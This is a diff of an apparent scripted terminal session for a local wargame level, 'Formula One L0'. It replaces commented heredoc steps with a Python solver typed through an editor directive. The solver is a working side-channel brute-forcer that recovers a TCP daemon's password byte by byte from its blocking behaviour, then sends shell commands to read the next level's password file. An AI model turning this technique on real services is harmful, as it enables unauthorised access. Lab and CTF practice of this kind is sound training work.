@@ -1,57 +1,53 @@
 @sleep 1
 id
-echo '# Formula One L0: TCP password gate on 127.0.0.1:4091, source world-readable:'
 ls -la /formulaone/formulaone0.c
 cat /formulaone/formulaone0.c
-echo '# The oracle: a WRONG byte answers WRONG PASSWORD immediately; a CORRECT byte'
-echo '# makes the daemon block in recv() for the next byte (no response = correct).'
-echo '# Writing the scanner (heredoc, code visible):'
-@line cat > /tmp/f1_solve.py <<'PYEOF'
-@line import socket, string, time
-@line HOST, PORT = "127.0.0.1", 4091
-@line def probe(prefix):
-@line     s = socket.create_connection((HOST, PORT), timeout=5)
-@line     s.recv(20)
-@line     s.sendall(prefix)
-@line     s.settimeout(1.5)
-@line     try:
-@line         r = s.recv(50)
-@line         return "WRONG" if b"WRONG" in r else "DATA"
-@line     except socket.timeout:
-@line         return "BLOCKED"   # correct byte: daemon blocks in recv
-@line     finally:
-@line         s.close()
-@line chars = [c.encode() for c in string.ascii_letters + string.digits + "_-{}!@#$%^&*()"]
-@line pw = b""
-@line for pos in range(32):
-@line     for c in chars:
-@line         if probe(pw + c) == "BLOCKED":
-@line             pw += c
-@line             print("pos", pos, "->", pw.decode(), flush=True)
-@line             break
-@line     else:
-@line         break
-@line print("PASSWORD:", pw.decode(), flush=True)
-@line s = socket.create_connection((HOST, PORT), timeout=5)
-@line s.recv(20)
-@line s.sendall(pw)
-@line time.sleep(0.5)
-@line s.sendall(b"id\n")
-@line time.sleep(0.5)
-@line s.sendall(b"cat /etc/formulaone_pass/formulaone0\n")
-@line time.sleep(1)
-@line s.settimeout(4)
-@line data = b""
-@line try:
-@line     while True:
-@line         c = s.recv(4096)
-@line         if not c: break
-@line         data += c
-@line except socket.timeout:
-@line     pass
-@line print("SHELL OUTPUT:\n" + data.decode("latin-1"))
-@line PYEOF
-timeout 300 python3 /tmp/f1_solve.py
-echo rc=$?
+mkdir -p /run/screen/f0 && cd /run/screen/f0
+@vi /run/screen/f0/f1_solve.py
+import socket, string, time
+HOST, PORT = "127.0.0.1", 4091
+def probe(prefix):
+    s = socket.create_connection((HOST, PORT), timeout=5)
+    s.recv(20)
+    s.sendall(prefix)
+    s.settimeout(1.5)
+    try:
+        r = s.recv(50)
+        return "WRONG" if b"WRONG" in r else "DATA"
+    except socket.timeout:
+        return "BLOCKED"   # correct byte: daemon blocks in recv
+    finally:
+        s.close()
+chars = [c.encode() for c in string.ascii_letters + string.digits + "_-{}!@#$%^&*()"]
+pw = b""
+for pos in range(32):
+    for c in chars:
+        if probe(pw + c) == "BLOCKED":
+            pw += c
+            print("pos", pos, "->", pw.decode(), flush=True)
+            break
+    else:
+        break
+print("PASSWORD:", pw.decode(), flush=True)
+s = socket.create_connection((HOST, PORT), timeout=5)
+s.recv(20)
+s.sendall(pw)
+time.sleep(0.5)
+s.sendall(b"id\n")
+time.sleep(0.5)
+s.sendall(b"cat /etc/formulaone_pass/formulaone0\n")
+time.sleep(1)
+s.settimeout(4)
+data = b""
+try:
+    while True:
+        c = s.recv(4096)
+        if not c: break
+        data += c
+except socket.timeout:
+    pass
+print("SHELL OUTPUT:\n" + data.decode("latin-1"))
+@viend
+timeout 300 python3 /run/screen/f0/f1_solve.py
 @sleep 2
 exit
